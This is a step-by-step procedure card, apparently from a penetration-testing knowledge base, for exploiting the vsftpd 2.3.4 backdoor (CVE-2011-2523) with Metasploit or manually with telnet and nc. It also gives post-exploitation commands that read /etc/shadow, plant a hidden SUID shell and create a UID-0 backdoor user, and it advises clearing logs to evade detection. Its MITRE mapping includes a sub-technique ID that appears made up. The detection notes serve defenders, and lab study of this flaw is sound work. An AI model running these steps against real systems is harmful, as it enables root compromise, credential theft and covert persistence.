---
id: b9f2e8d1-5c3a-4d7b-9e6f-2a8c1f4b7d9e
name: vsftpd 2.3.4 Backdoor Exploitation via Metasploit
type: procedure
verified: true
submitted: true
created_at: '2023-12-09T00:00:00.000000+00:00'
updated_at: '2025-11-30T21:55:00.000000+00:00'
platforms:
- Linux
tags:
- ftp
- backdoor
- metasploit
- remote code execution
- initial access
- vsftpd
- metasploitable2
- CVE-2011-2523
mitre_tactics:
- TA0001  # Initial Access
- TA0002  # Execution
- TA0004  # Privilege Escalation
mitre_techniques:
- T1190   # Exploit Public-Facing Application
- T1059   # Command and Scripting Interpreter
skill_level: beginner
impact_level: high
detection_risk: high
commands:
- '[[metasploit start msfconsole]]'
- '[[metasploit search vsftpd]]'
- '[[metasploit use vsftpd_234_backdoor]]'
- '[[metasploit set RHOSTS]]'
- '[[metasploit run exploit]]'
tools:
- '[[Metasploit Framework]]'
cve:
- CVE-2011-2523
---

# vsftpd 2.3.4 Backdoor Exploitation via Metasploit

**Status**: ‚úì Verified

## Summary

Exploit the malicious backdoor vulnerability in vsftpd 2.3.4 to gain immediate root-level shell access. This backdoor was introduced into the vsftpd source code and triggers a shell listener on port 6200 when a specific sequence is sent to the FTP service.

## Description

# Description 

vsftpd (Very Secure FTP Daemon) version 2.3.4 contains a backdoor that was maliciously inserted into the source code. When a username containing a smiley face emoticon (":)") is sent to the service, it opens a backdoor shell on TCP port 6200 with root privileges.

This vulnerability:
- Requires no authentication
- Provides immediate root access
- Bypasses all security controls
- Is trivially exploitable via Metasploit Framework

**CVE:** CVE-2011-2523

**Affected Versions:**
- vsftpd 2.3.4 (specific backdoored release)

**Impact:**
- Complete system compromise
- Root-level command execution
- No authentication required

## MITRE ATT&CK Mapping

**Tactics:**
- TA0001 - Initial Access
- TA0002 - Execution  
- TA0004 - Privilege Escalation

**Techniques:**
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter

**Sub-Techniques:**
- T1190.001 - FTP Service Exploitation
- Backdoor Trigger Mechanism

## Instructions

### Step 1: Launch Metasploit Framework

Start the Metasploit console:

**Command:** [[metasploit start msfconsole]]

```bash
msfconsole
```

Wait for Metasploit to fully initialize (banner and prompt will appear).

### Step 2: Search for vsftpd Exploit Module

Search for available vsftpd exploit modules:

**Command:** [[metasploit search vsftpd]]

```bash
search vsftpd
```

**Expected Output:**
```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

### Step 3: Select the Exploit Module

Load the vsftpd backdoor exploit:

**Command:** [[metasploit use vsftpd_234_backdoor]]

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 4: View and Configure Options

Check required options:

```bash
show options
```

Set the target host (RHOSTS):

**Command:** [[metasploit set RHOSTS]]

```bash
set RHOSTS <target_ip>
```

**Example:**
```bash
set RHOSTS 192.168.137.128
```

### Step 5: Execute the Exploit

Launch the exploit:

**Command:** [[metasploit run exploit]]

```bash
run
```

Or alternatively:
```bash
exploit
```

**Expected Output:**
```
[*] 192.168.137.128:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.137.128:21 - USER: 331 Please specify the password.
[+] 192.168.137.128:21 - Backdoor service has been spawned, handling...
[+] 192.168.137.128:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

### Step 6: Verify Root Access

Once the shell opens, verify privileges:

```bash
id
whoami
uname -a
```

**Expected Output:**
```
uid=0(root) gid=0(root)
root
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

### Step 7: Post-Exploitation Actions

With root access, you can:

1. **Enumerate system:**
```bash
ls -la /root
cat /etc/shadow
cat /etc/passwd
```

2. **Establish persistence:**
```bash
cp /bin/bash /tmp/.hidden_shell
chmod +s /tmp/.hidden_shell
```

3. **Dump credentials:**
```bash
cat /etc/shadow > /tmp/shadow.txt
```

4. **Create backdoor user:**
```bash
useradd -ou 0 -g 0 backdoor
echo "backdoor:password" | chpasswd
```

## Platforms

- Linux

## Tags

- ftp
- backdoor
- metasploit
- remote code execution
- initial access
- vsftpd
- metasploitable2
- CVE-2011-2523

## Expected Outcomes

**Success Indicators:**
‚úÖ Backdoor service spawned on port 6200
‚úÖ Command shell session opened
‚úÖ Root privileges confirmed (uid=0)
‚úÖ Full system access obtained

**Failure Indicators:**
‚ùå Connection refused (vsftpd not running)
‚ùå Backdoor not spawned (wrong version)
‚ùå Timeout (firewall blocking port 6200)

## Detection & Evasion

**Detection Risk:** üî¥ High

**Detection Methods:**
- IDS/IPS signatures for Metasploit Framework
- Connection to unusual port 6200
- FTP service logs showing malformed username
- Network traffic analysis (smiley face in username)
- Process monitoring (unexpected shell spawned by vsftpd)

**Indicators of Compromise:**
- TCP connection to port 6200
- vsftpd process spawning shell
- Root shell activity from FTP service
- Unusual outbound connections

**Evasion Techniques:**
- Limited evasion possible (exploit is highly detectable)
- Use encrypted tunnel for port 6200 traffic
- Clean logs immediately after exploitation
- Use in conjunction with other exploits to blend activity

## Troubleshooting

**Issue:** "Exploit failed: Rex::ConnectionRefused"
- Solution: Verify FTP service is running on port 21, check network connectivity

**Issue:** Backdoor does not spawn
- Solution: Confirm exact version is 2.3.4 (run nmap -sV), try manual exploitation

**Issue:** Session opens then immediately closes
- Solution: Check for automated cleanup scripts, firewall blocking port 6200

**Issue:** "Handler failed to bind to <ip>:6200"
- Solution: Port already in use, kill conflicting process or use different LHOST

## Manual Exploitation (Alternative Method)

If Metasploit is unavailable, manually trigger the backdoor:

```bash
# Connect to FTP
telnet <target_ip> 21

# Send malicious username
USER backdoor:)
PASS anything

# Connect to spawned backdoor
nc -nv <target_ip> 6200
```

## Related Procedures

- [[Network Service Discovery and Enumeration (Nmap)]]
- [[FTP Credential Brute Force]]
- [[Post-Exploitation Linux Enumeration]]

## References

- [CVE-2011-2523 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
- [Metasploit Module Documentation](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [vsftpd Backdoor Analysis](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
- Metasploitable2 Exploitation Walkthrough - Rajesh Kumar
